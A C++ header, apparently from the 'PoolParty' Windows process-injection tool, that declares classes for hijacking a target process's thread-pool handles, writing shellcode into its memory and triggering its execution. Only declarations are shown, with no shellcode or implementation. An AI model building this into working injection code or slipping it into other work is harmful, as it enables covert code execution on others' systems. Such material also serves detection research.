#pragma once
#include <iostream>
#include <Windows.h>
#include "Misc.hpp"
#include "Native.hpp"
#include "WorkerFactory.hpp"
#include "ThreadPool.hpp"
#include "WinApi.hpp"
#include "HandleHijacker.hpp"

#define POOL_PARTY_ALPC_PORT_NAME L"\\RPC Control\\PoolPartyALPCPort"
#define POOL_PARTY_EVENT_NAME L"PoolPartyEvent"
#define POOL_PARTY_FILE_NAME L"PoolParty.txt"
#define POOL_PARTY_JOB_NAME L"PoolPartyJob"

#define INIT_UNICODE_STRING(str) { sizeof(str) - sizeof((str)[0]), sizeof(str) - sizeof((str)[0]), const_cast<PWSTR>(str) }

typedef struct _POOL_PARTY_CMD_ARGS
{
	BOOL bDebugPrivilege;
	int VariantId;
	int TargetPid;
} POOL_PARTY_CMD_ARGS, * PPOOL_PARTY_CMD_ARGS;

class PoolParty
{
protected:
	DWORD m_dwTargetPid;
	std::shared_ptr<HANDLE> m_p_hTargetPid;
	unsigned char* m_cShellcode;
	SIZE_T m_szShellcodeSize;
	PVOID m_ShellcodeAddress;
	LPVOID m_RemoteObjectAddress;
public:
	PoolParty(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	std::shared_ptr<HANDLE> GetTargetThreadPoolWorkerFactoryHandle() const;
	WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation(HANDLE hWorkerFactory) const;
	std::shared_ptr<HANDLE> GetTargetThreadPoolIoCompletionHandle() const;
	std::shared_ptr<HANDLE> GetTargetThreadPoolTimerHandle() const;
	std::shared_ptr<HANDLE> GetTargetProcessHandle() const;
	virtual void HijackHandles();
	virtual LPVOID AllocateShellcodeMemory() const;
	void WriteShellcode() const;
	virtual void SetupExecution() const PURE;
	void Inject();
	void Cleanup() const;
	virtual ~PoolParty() = default;
};

class AsynchronousWorkItemInsertion : public PoolParty {
protected:
	std::shared_ptr<HANDLE> m_p_hIoCompletion;
public:
	AsynchronousWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void HijackHandles() override;
	~AsynchronousWorkItemInsertion() override = default;
};

class RemoteTpDirectInsertion : public AsynchronousWorkItemInsertion {
public:
	RemoteTpDirectInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
	void SetupExecution() const override;
	~RemoteTpDirectInsertion() override = default;
};